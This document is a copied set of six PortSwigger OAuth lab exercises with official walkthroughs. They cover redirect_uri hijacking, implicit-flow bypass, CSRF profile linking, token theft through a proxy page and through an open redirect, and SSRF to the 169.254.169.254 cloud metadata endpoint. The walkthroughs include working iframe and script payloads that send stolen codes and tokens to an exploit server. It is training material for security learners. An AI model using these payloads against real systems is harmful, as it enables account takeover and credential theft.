# PortSwigger labs: oauth

> Copied from <https://portswigger.net/web-security/oauth>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. OAuth account hijacking via redirect_uri

[Open the lab](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`.

<details><summary>Official solution</summary>

1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
3. In Burp, study the OAuth flow in the proxy history and identify the **most recent** authorization request. This should start with `GET /auth?client_id=[...]`. Notice that when this request is sent, you are immediately redirected to the `redirect_uri` along with the authorization code in the query string. Send this authorization request to Burp Repeater.
4. In Burp Repeater, observe that you can submit any arbitrary value as the `redirect_uri` without encountering an error. Notice that your input is used to generate the redirect in the response.
5. Change the `redirect_uri` to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
6. Go back to the exploit server and create the following `iframe` at `/exploit`:

   `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
7. Store the exploit and click "View exploit". Check that your `iframe` loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code.
8. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
9. Log out of the blog website and then use the stolen code to navigate to:

   `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`

   The rest of the OAuth flow will be completed automatically and you will be logged in as the admin user. Open the admin panel and delete `carlos` to solve the lab.

</details>


## 2. Authentication bypass via OAuth implicit flow

[Open the lab](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.

You can log in with your own social media account using the following credentials: `wiener:peter`.

<details><summary>Official solution</summary>

1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that make up the OAuth flow. This starts from the authorization request `GET /auth?client_id=[...]`.
3. Notice that the client application (the blog website) receives some basic information about the user from the OAuth service. It then logs the user in by sending a `POST` request containing this information to its own `/authenticate` endpoint, along with the access token.
4. Send the `POST /authenticate` request to Burp Repeater. In Repeater, change the email address to `carlos@carlos-montoya.net` and send the request. Observe that you do not encounter an error.
5. Right-click on the `POST` request and select "Request in browser" > "In original session". Copy this URL and visit it in the browser. You are logged in as Carlos and the lab is solved.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=N4P1GNlaouM

</details>


## 3. Forced OAuth profile linking

[Open the lab](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

- Blog website account: `wiener:peter`
- Social media profile: `peter.wiener:hotdog`

<details><summary>Official solution</summary>

1. While proxying traffic through Burp, click "My account". You are taken to a normal login page, but notice that there is an option to log in using your social media profile instead. For now, just log in to the blog website directly using the classic login form.
2. Notice that you have the option to attach your social media profile to your existing account.
3. Click "Attach a social profile". You are redirected to the social media website, where you should log in using your social media credentials to complete the OAuth flow. Afterwards, you will be redirected back to the blog website.
4. Log out and then click "My account" to go back to the login page. This time, choose the "Log in with social media" option. Observe that you are logged in instantly via your newly linked social media account.
5. In the proxy history, study the series of requests for attaching a social profile. In the `GET /auth?client_id[...]` request, observe that the `redirect_uri` for this functionality sends the authorization code to `/oauth-linking`. Importantly, notice that the request does not include a `state` parameter to protect against CSRF attacks.
6. Turn on proxy interception and select the "Attach a social profile" option again.
7. Go to Burp Proxy and forward any requests until you have intercepted the one for `GET /oauth-linking?code=[...]`. Right-click on this request and select "Copy URL".
8. Drop the request. This is important to ensure that the code is not used and, therefore, remains valid.
9. Turn off proxy interception and log out of the blog website.
10. Go to the exploit server and create an `iframe` in which the `src` attribute points to the URL you just copied. The result should look something like this:

    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
11. Deliver the exploit to the victim. When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website.
12. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete `carlos` to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=cigU8Jau6LQ

</details>


## 4. Stealing OAuth access tokens via a proxy page

[Open the lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

#### Note

As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

<details><summary>Official solution</summary>

1. Study the OAuth flow while proxying traffic through Burp. Using the same method as in the [previous lab](/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect), identify that the `redirect_uri` is vulnerable to directory traversal. This enables you to redirect access tokens to arbitrary pages on the blog website.
2. Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an `iframe` on each blog post. Look closer at the `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the `window.location.href` property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
3. From the proxy history, right-click on the `GET /auth?client_id=[...]` request and select "Copy URL". Go to the exploit server and create an `iframe` in which the `src` attribute is the URL you just copied. Use directory traversal to change the `redirect_uri` so that it points to the comment form. The result should look something like this:

   `<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>`
4. Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log:

   `<script>
   window.addEventListener('message', function(e) {
   fetch("/" + encodeURIComponent(e.data.data))
   }, false)
   </script>`
5. To check the exploit is working, store it and then click "View exploit". Make sure that the `iframe` loads then go to the exploit server's access log. There should be a request for which the path is the full URL of the comment form, along with a fragment containing the access token.
6. Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log. Make sure you don't accidentally include any of the surrounding URL-encoded characters.
7. Send the `GET /me` request to Burp Repeater. In Repeater, replace the token in the `Authorization: Bearer` header with the one you just copied and send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
8. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=zvZmWc_Uhm4

</details>


## 5. Stealing OAuth access tokens via an open redirect

[Open the lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

#### Note

You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

<details><summary>Official solution</summary>

1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at `/me` and then uses the data it fetches to log the user in. Send the `GET /me` request to Burp Repeater.
3. Log out of your account and log back in again. From the proxy history, find the most recent `GET /auth?client_id=[...]` request and send it to Repeater.
4. In Repeater, experiment with the `GET /auth?client_id=[...]` request. Observe that you cannot supply an external domain as `redirect_uri` because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the `/../` path traversal sequence.
5. Log out of your account on the blog website and turn on proxy interception in Burp.
6. In the browser, log in again and go to the intercepted `GET /auth?client_id=[...]` request in Burp Proxy.
7. Confirm that the `redirect_uri` parameter is in fact vulnerable to directory traversal by changing it to:

   `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`

   Forward any remaining requests and observe that you are eventually redirected to the first blog post. In the browser, notice that your access token is included in the URL as a fragment.
8. With the help of Burp, audit the other pages on the blog website. Identify the "Next post" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding `GET /post/next?path=[...]` request to Repeater.
9. In Repeater, experiment with the `path` parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
10. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the `redirect_uri` pointing to the open redirect, which subsequently forwards the victim to your exploit server:

    `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
11. Test that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
12. On the exploit server, create a suitable script at `/exploit` that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:

    `<script>
    window.location = '/?'+document.location.hash.substr(1)
    </script>`
13. To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for `GET /?access_token=[...]`.
14. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:

    `<script>
    if (!document.location.hash) {
    window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
    window.location = '/?'+document.location.hash.substr(1)
    }
    </script>`
15. To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for `GET /?access_token=[...]`.
16. Deliver the exploit to the victim, then copy their access token from the log.
17. In Repeater, go to the `GET /me` request and replace the token in the `Authorization: Bearer` header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
18. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=grkMW56WX2E

##### Michael Sommer

https://www.youtube.com/watch?v=miymbxDQ3j4

</details>


## 6. SSRF via OpenID dynamic client registration

[Open the lab](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)

This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: `wiener:peter`

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

<details><summary>Official solution</summary>

1. While proxying traffic through Burp, log in to your own account. Browse to `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration` to access the configuration file. Notice that the client registration endpoint is located at `/reg`.
2. In Burp Repeater, create a suitable `POST` request to register your own client application with the OAuth service. You must at least provide a `redirect_uris` array containing an arbitrary whitelist of callback URIs for your fake application. For example:

   `POST /reg HTTP/1.1
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   Content-Type: application/json
   {
   "redirect_uris" : [
   "https://example.com"
   ]
   }`
3. Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new `client_id`.
4. Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration. Send the `GET /client/CLIENT-ID/logo` request to Burp Repeater.
5. In Repeater, go back to the `POST /reg` request that you created earlier. Add the `logo_uri` property. Right-click and select "Insert Collaborator payload" to paste a Collaborator URL as its value . The final request should look something like this:

   `POST /reg HTTP/1.1
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   Content-Type: application/json
   {
   "redirect_uris" : [
   "https://example.com"
   ],
   "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
   }`
6. Send the request to register a new client application and copy the `client_id` from the response.
7. In Repeater, go to the `GET /client/CLIENT-ID/logo` request. Replace the `CLIENT-ID` in the path with the new one you just copied and send the request.
8. Go to the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the `logo_uri` property to elicit requests from the OAuth server.
9. Go back to the `POST /reg` request in Repeater and replace the current `logo_uri` value with the target URL:

   `"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`
10. Send this request and copy the new `client_id` from the response.
11. Go back to the `GET /client/CLIENT-ID/logo` request and replace the `client_id` with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
12. Use the "Submit solution" button to submit the access key and solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=IX2UTPA8HOQ

</details>

